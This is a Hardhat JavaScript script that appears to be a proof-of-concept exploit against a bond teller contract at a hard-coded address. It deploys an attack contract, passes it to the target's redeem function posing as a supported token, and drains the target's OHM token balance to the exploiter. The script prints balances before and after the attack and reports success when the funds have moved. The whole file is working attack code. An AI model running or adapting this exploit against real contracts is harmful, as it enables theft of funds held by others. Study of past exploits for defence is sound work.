const hre = require("hardhat");
const ethers = hre.ethers;

// Interface for the OHM Token
const ERC20 = [
  "function symbol() external pure returns (string memory)",
  "function decimals() external pure returns (uint8)",
  "function balanceOf(address account) external view returns (uint256)",
 ];

// Interface for the target contract and function
const BondFixedExpiryTeller = [
  "function redeem(address token_, uint256 amount_)",
];

async function getTokenQuantity(tokenContract, tokenAmount) {
  tokenDecimals = await tokenContract.decimals();
  tokenSymbol = await tokenContract.symbol();

  const tokenScale = new ethers.BigNumber.from('10') ** new ethers.BigNumber.from(tokenDecimals);
  const convertedAmount = new ethers.BigNumber.from(tokenAmount) / tokenScale;

  return {'amount': convertedAmount, 'symbol': tokenSymbol};
}

async function main() {
  // set up two wallets
  const [owner] = await ethers.getSigners();

  // Deploy exploit contract
  const Exploit = await ethers.getContractFactory("AttackContract");
  console.log('+ Deploy exploit contract');
  const exploitDeployTx = await Exploit.deploy();
  const exploitContractAddress = exploitDeployTx.deployTransaction.creates;
  console.log(`  exploit contract address: ${exploitContractAddress}\n`);

  // Target Contract Address
  const targetContractAddress = '0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156';
  // OHM Token Address
  const OHMTokenAddress = '0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5';

  // Get the balance of OHM Token of our target contract, so we can drain its funds
  const OHMTContract = await ethers.getContractAt(ERC20, OHMTokenAddress);
  const targetContractBalance = await OHMTContract.balanceOf(targetContractAddress);

  // Display Pre-Attack Balances
  console.log(`  ======= Pre-Attack Balances ======`);
  let targetBalancePre = await getTokenQuantity(OHMTContract, await OHMTContract.balanceOf(targetContractAddress));
  let exploiterBalancePre = await getTokenQuantity(OHMTContract, await OHMTContract.balanceOf(owner.address));
  console.log(`  Target Balance: ${targetBalancePre.amount} ${targetBalancePre.symbol}`);
  console.log(`  Exploiter Balance: ${exploiterBalancePre.amount} ${exploiterBalancePre.symbol}\n`);
 
  const targetContract = await ethers.getContractAt(BondFixedExpiryTeller, targetContractAddress);

  // Execute the attack
  // - pass in our exploit contract posing as a supported token
  // - pass in the amount of funds we want to drain
  console.log('+ Execute Attack\n');
  await targetContract.redeem(exploitContractAddress, targetContractBalance);

  // Diplay Post-Attack Balances
  console.log(`  ======= Pre-Attack Balances ======`);
  let targetBalance = await getTokenQuantity(OHMTContract, await OHMTContract.balanceOf(targetContractAddress));
  let exploiterBalance = await getTokenQuantity(OHMTContract, await OHMTContract.balanceOf(owner.address));
  console.log(`  Target Balance: ${targetBalance.amount} ${targetBalance.symbol}`);
  console.log(`  Exploiter Balance: ${exploiterBalance.amount} ${exploiterBalance.symbol}\n`);

  // Test that funds were transferred to us
  if (targetBalancePre.amount === targetBalance.amount || exploiterBalancePre.amount === exploiterBalance.amount) {
    console.error("!! Exploit did not transfer target's funds to us");
    return;
  }

  console.log('Success!');

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });